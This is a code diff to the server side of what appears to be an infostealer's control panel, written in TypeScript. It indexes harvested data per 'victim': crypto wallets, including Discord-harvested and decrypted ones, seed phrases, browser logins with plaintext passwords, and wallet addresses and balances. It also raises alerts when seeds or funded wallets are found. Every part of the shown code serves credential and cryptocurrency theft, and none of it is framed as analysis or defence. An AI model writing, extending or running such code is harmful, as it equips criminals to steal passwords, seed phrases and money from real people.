@@ -13,6 +13,7 @@ import { artifactKey, hmac, openBuildSecret, openSecretLoose, sha256hex } from '
 import { publish } from '../lib/bus';
 import { notify } from './notify';
 import { saltForEpoch } from './victim';
+import { normalizePath, normalizeSecretKind, upsertCredentials, upsertSecrets, upsertWallets, type SecretInput } from './vault';
 
 export const uploadDir = (id: string) => join(env.STORAGE_DIR, 'uploads', `${id}.bin`);
 export const artifactDir = (id: string) => join(env.STORAGE_DIR, 'artifacts', id);
@@ -611,11 +612,16 @@ async function indexHarvest(victimId: string, artifactId: string, paths: string[
     if (seen.has(key)) continue;
     seen.add(key);
     const walletPath = `discord:${artifactId}:${id}`;
-    await prisma.wallet.upsert({
-      where: { victimId_path: { victimId, path: walletPath } },
-      update: { artifactId, state: decrypted ? 'decrypted' : 'locked', reason: 'discord_harvest', decryptState: decrypted ? 'done' : 'none' },
-      create: { victimId, artifactId, kind: 'desktop', targetId: id, path: walletPath, state: decrypted ? 'decrypted' : 'locked', reason: 'discord_harvest' }
-    });
+    await upsertWallets(victimId, [{
+      targetId: id,
+      kind: 'desktop',
+      path: walletPath,
+      state: decrypted ? 'decrypted' : 'locked',
+      reason: 'discord_harvest',
+      decryptState: decrypted ? 'done' : 'none',
+      artifactId,
+      source: 'discord'
+    }]);
     if (decrypted) await walletNotification(victimId, id, walletPath, 'decrypted');
   }
   for (const path of paths) {
@@ -625,28 +631,63 @@ async function indexHarvest(victimId: string, artifactId: string, paths: string[
   }
 }
 
-async function indexWalletJson(victimId: string, artifactId: string, path: string): Promise<void> {
+async function indexWalletJson(victimId: string, artifactId: string, path: string, source = 'artifact'): Promise<void> {
   try {
     const parsed = JSON.parse(await readFile(path, 'utf8')) as {
-      wallets?: Array<{ id: string; kind: string; path: string; state: string; reason?: string; address?: string; balance?: string }>;
-      seeds?: Array<{ path: string; kind: string; value: string; words?: number }>;
+      wallets?: Array<{ id: string; kind: string; path: string; state: string; reason?: string; address?: string; balance?: string; decrypt_state?: string }>;
+      seeds?: Array<{ path: string; kind: string; value: string; words?: number; confident?: boolean }>;
     };
+    const wallets = (parsed.wallets ?? []).map((wallet) => ({
+      targetId: wallet.id || 'unknown',
+      kind: wallet.kind || 'extension',
+      path: wallet.path,
+      state: wallet.state,
+      reason: wallet.reason ?? null,
+      address: wallet.address ?? null,
+      balance: wallet.balance ?? null,
+      decryptState: wallet.decrypt_state,
+      artifactId,
+      source
+    }));
+    const stored = await upsertWallets(victimId, wallets);
+    const byPath = new Map(stored.map((row) => [row.path, row.id]));
+    const secrets: SecretInput[] = [];
     for (const wallet of parsed.wallets ?? []) {
-      await prisma.wallet.upsert({
-        where: { victimId_path: { victimId, path: wallet.path } },
-        update: { artifactId, kind: wallet.kind, targetId: wallet.id, state: wallet.state as never, reason: wallet.reason ?? 'discord_scan', address: wallet.address ?? null, balance: wallet.balance ?? null },
-        create: { victimId, artifactId, kind: wallet.kind, targetId: wallet.id, path: wallet.path, state: wallet.state as never, reason: wallet.reason ?? 'discord_scan', address: wallet.address ?? null, balance: wallet.balance ?? null }
-      });
       if (wallet.state === 'decrypted') await walletNotification(victimId, wallet.id, wallet.path, 'decrypted');
       if (wallet.balance && wallet.balance !== '0') await walletNotification(victimId, wallet.id, wallet.path, `balance ${wallet.balance}`);
     }
     for (const seed of parsed.seeds ?? []) {
-      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: seed.kind, value: seed.value, words: seed.words ?? 0, path: seed.path, source: 'discord_scan' } } });
+      if (!seed.value) continue;
+      secrets.push({
+        walletId: seed.path ? byPath.get(normalizePath(seed.path)) ?? null : null,
+        path: seed.path ?? null,
+        kind: seed.kind || 'seed',
+        value: seed.value,
+        words: seed.words ?? null,
+        confidence: seed.confident === false ? 0.5 : null,
+        artifactId,
+        source
+      });
       await seedNotification(victimId, seed.value, seed.path);
+      await createSeedEvent(victimId, seed.value, seed.path, seed.kind, seed.words, artifactId);
     }
+    await upsertSecrets(victimId, secrets);
   } catch {
     // malformed index still remains in Files
   }
+}
+
+async function createSeedEvent(victimId: string, value: string, path: string, kind?: string, words?: number, artifactId?: string): Promise<void> {
+  const hash = sha256hex(value);
+  const since = new Date(Date.now() - 24 * 3600_000);
+  const existing = await prisma.event.findFirst({
+    where: { victimId, kind: 'seed_found', createdAt: { gte: since }, data: { path: ['hash'], equals: hash } },
+    select: { id: true }
+  }).catch(() => null);
+  if (existing) return;
+  await prisma.event.create({
+    data: { victimId, kind: 'seed_found', data: { path, type: kind ?? 'seed', words: words ?? 0, value, hash, artifactId: artifactId ?? null } as never }
+  });
 }
 
 async function indexTextFile(victimId: string, path: string, name: string): Promise<void> {
@@ -668,55 +709,104 @@ async function indexTextFile(victimId: string, path: string, name: string): Prom
   }
 }
 
+async function indexCredentialFile(victimId: string, artifactId: string, path: string): Promise<void> {
+  try {
+    const parsed = JSON.parse(await readFile(path, 'utf8')) as {
+      browser_state?: string;
+      mode?: string;
+      logins?: Array<{ origin?: string; username?: string; password?: string }>;
+    };
+    const targetId = normalizePath(parsed.browser_state ?? path).split('/').slice(-3, -1).join('/') || 'browser';
+    const store = normalizePath(parsed.browser_state ?? path);
+    const rows = (parsed.logins ?? []).map((login) => ({
+      path: store,
+      url: login.origin ?? null,
+      username: login.username ?? '',
+      password: login.password ?? '',
+      kind: store.includes('mozilla') || store.includes('firefox') ? 'firefox' : 'browser',
+      state: login.password ? 'found' : 'empty',
+      reason: parsed.mode ?? null
+    }));
+    await upsertCredentials(victimId, targetId, artifactId, rows);
+  } catch {
+    // credentials.json is optional
+  }
+}
+
+async function indexFindingsFile(
+  victimId: string,
+  artifactId: string,
+  target: string,
+  path: string,
+  byPath: Map<string, string>,
+  targetWallets: string[]
+): Promise<void> {
+  try {
+    const parsed = JSON.parse(await readFile(path, 'utf8')) as {
+      findings?: Array<{ path: string; kind: string; value: string; words?: number }>;
+    };
+    const secrets: SecretInput[] = [];
+    for (const finding of parsed.findings ?? []) {
+      if (!finding.value) continue;
+      const direct = byPath.get(normalizePath(finding.path));
+      secrets.push({
+        walletId: direct ?? targetWallets[0] ?? null,
+        path: finding.path,
+        kind: finding.kind,
+        value: finding.value,
+        words: finding.words ?? null,
+        artifactId,
+        source: 'scan_findings'
+      });
+      if (normalizeSecretKind(finding.kind) === 'seed') await seedNotification(victimId, finding.value, finding.path);
+    }
+    await upsertSecrets(victimId, secrets);
+  } catch {
+    // findings.json is optional
+  }
+}
+
+async function indexAddressesFile(victimId: string, target: string, path: string): Promise<void> {
+  try {
+    const parsed = JSON.parse(await readFile(path, 'utf8')) as Array<{ address?: string; balance?: string }>;
+    const first = parsed.find((row) => row.address);
+    if (!first?.address) return;
+    await prisma.wallet.updateMany({
+      where: { victimId, targetId: target, address: null },
+      data: { address: first.address, balance: first.balance ?? null }
+    });
+  } catch {
+    // optional
+  }
+}
+
 async function indexArtifact(artifactId: string, victimId: string, manifest: Manifest, root: string): Promise<void> {
   if (manifest.module === 'wallets') {
     const file = join(root, 'wallets.json');
-    try {
-      const parsed = JSON.parse(await readFile(file, 'utf8')) as WalletIndex;
-      for (const wallet of parsed.wallets ?? []) {
-        await prisma.wallet.upsert({
-          where: { victimId_path: { victimId, path: wallet.path } },
-          update: {
-            artifactId,
-            kind: wallet.kind,
-            targetId: wallet.id,
-            state: wallet.state as never,
-            reason: wallet.reason ?? null,
-            address: wallet.address ?? null,
-            balance: wallet.balance ?? null,
-            decryptState: wallet.decrypt_state ?? 'none'
-          },
-          create: {
-            victimId,
-            artifactId,
-            kind: wallet.kind,
-            targetId: wallet.id,
-            path: wallet.path,
-            state: wallet.state as never,
-            reason: wallet.reason ?? null,
-            address: wallet.address ?? null,
-            balance: wallet.balance ?? null,
-            decryptState: wallet.decrypt_state ?? 'none'
-          }
-        });
-        if (wallet.state === 'decrypted') {
-          await prisma.event.create({
-            data: { victimId, kind: 'wallet_decrypted', data: { path: wallet.path, target: wallet.id } }
-          });
-          await walletNotification(victimId, wallet.id, wallet.path, 'decrypted');
-        }
-        if (wallet.balance && wallet.balance !== '0') {
-          await walletNotification(victimId, wallet.id, wallet.path, `balance ${wallet.balance}`);
-        }
+    await indexWalletJson(victimId, artifactId, file, 'scan_artifact');
+    const wallets = await prisma.wallet.findMany({ where: { victimId }, select: { id: true, targetId: true, path: true, address: true, state: true } });
+    const byPath = new Map(wallets.map((wallet) => [normalizePath(wallet.path), wallet.id]));
+    for (const entry of manifest.artifacts) {
+      const lower = entry.path.toLowerCase();
+      if (lower.startsWith('credentials/') && lower.endsWith('.json')) {
+        await indexCredentialFile(victimId, artifactId, join(root, safeRel(entry.path)));
+      } else if (lower.endsWith('/findings.json') && lower.startsWith('wallets/')) {
+        const target = entry.path.split('/')[1] ?? 'unknown';
+        const targetWallets = wallets.filter((wallet) => wallet.targetId === target);
+        await indexFindingsFile(victimId, artifactId, target, join(root, safeRel(entry.path)), byPath, targetWallets.map((wallet) => wallet.id));
+      } else if (lower.endsWith('/addresses.json') && lower.startsWith('wallets/')) {
+        const target = entry.path.split('/')[1] ?? 'unknown';
+        await indexAddressesFile(victimId, target, join(root, safeRel(entry.path)));
       }
-      for (const seed of parsed.seeds ?? []) {
-        await prisma.event.create({
-          data: { victimId, kind: 'seed_found', data: { path: seed.path, type: seed.kind, words: seed.words ?? 0, value: seed.value } }
-        });
-        await seedNotification(victimId, seed.value, seed.path);
+    }
+    const decrypted = wallets.filter((wallet) => wallet.state === 'decrypted');
+    for (const wallet of decrypted) {
+      const exists = await prisma.event.findFirst({
+        where: { victimId, kind: 'wallet_decrypted', createdAt: { gte: new Date(Date.now() - 24 * 3600_000) }, data: { path: ['target'], equals: wallet.targetId } }
+      }).catch(() => null);
+      if (!exists) {
+        await prisma.event.create({ data: { victimId, kind: 'wallet_decrypted', data: { path: wallet.path, target: wallet.targetId } } });
       }
-    } catch {
-      // wallets.json is optional for other wallet modules
     }
   }
   if (manifest.module === 'clipboard') {
